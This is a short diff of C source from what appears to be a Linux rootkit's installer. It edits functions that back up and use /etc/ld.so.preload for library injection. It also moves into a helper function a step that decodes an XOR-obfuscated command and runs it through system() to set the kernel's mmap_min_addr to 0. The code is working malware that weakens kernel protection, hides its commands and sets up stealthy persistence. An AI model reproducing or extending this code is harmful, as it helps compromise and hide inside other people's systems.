@@ -101,7 +101,7 @@ int backup_ld_so_preload(char *ld_path) {
     }
     CLEAN(rk_backup);
     CLEAN(rk_home);
-    return 1;
+    return 0;
 }
 
 int has_backup_ld_so_preload(void) {
@@ -118,6 +118,12 @@ int has_backup_ld_so_preload(void) {
     CLEAN(rk_backup);
     CLEAN(ld_preload_so);
     return ret;
+}
+
+int set_mmap_min_addr(void) {
+    DEBUG_MSG("[-] set_mmap_min_addr() called\n");
+    char *set_mmap_min_addr = strdup(SET_MMAP_MIN_ADDR); xor(set_mmap_min_addr);
+    return system(set_mmap_min_addr);
 }
 
 int install_rk(char *libzpoline_path, char *nopfrog_path){
@@ -145,8 +151,7 @@ int install_rk(char *libzpoline_path, char *nopfrog_path){
             // TODO: Back mmap_min_addr up as well 
             // Set mmap_min_addr to 0
             DEBUG_MSG("[-] Setting mmap_min_addr\n");
-            char *set_mmap_min_addr = strdup(SET_MMAP_MIN_ADDR); xor(set_mmap_min_addr);
-            system(set_mmap_min_addr);
+            set_mmap_min_addr();
             char *libz = strdup(LIBZPOLINE_FILE_NAME); xor(libz);
             char ld_path[2048];
             sprintf(ld_path, "%s%s", rk_home, libz);
